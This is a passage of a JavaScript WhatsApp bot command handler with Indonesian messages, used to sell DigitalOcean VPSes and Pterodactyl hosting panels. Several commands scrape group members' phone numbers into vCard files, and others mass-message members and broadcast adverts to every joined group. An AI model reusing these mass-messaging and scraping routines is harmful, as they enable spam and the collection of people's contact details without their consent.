                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Xyro.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 14 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Xyro.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Xyro.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 14 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Xyro.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Xyro.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Xyro.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "produk": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await Xyro.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Xyro - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Xyro.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Xyro - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await Xyro.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya"))
const [idgc, pes] = text.split("|")
const teks = pes
const jidawal = m.chat
const data = await Xyro.groupMetadata(id)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Xyro.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Xyro.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Xyro.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await Xyro.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await Xyro.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await Xyro.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await Xyro.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Xyro.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Xyro.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Xyro.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Xyro.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Xyro.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Xyro.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Xyro.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Xyro.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Xyro.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Xyro.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Xyro.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Xyro.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Xyro.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Xyro.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Xyro.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "pay": case "payment": {
if (!isCreator) return Reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: { url: global.image.dana }}, { upload: Xyro.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: { url: global.image.ovo }}, { upload: Xyro.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: { url: global.image.gopay }}, { upload: Xyro.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: {url: global.image.qris }}, { upload: Xyro.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nPilih salah satu *payment* pembayaran yang tersedia"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.image.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtext2})
await Xyro.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA XYRO*

* *Nomor :* 085179856312
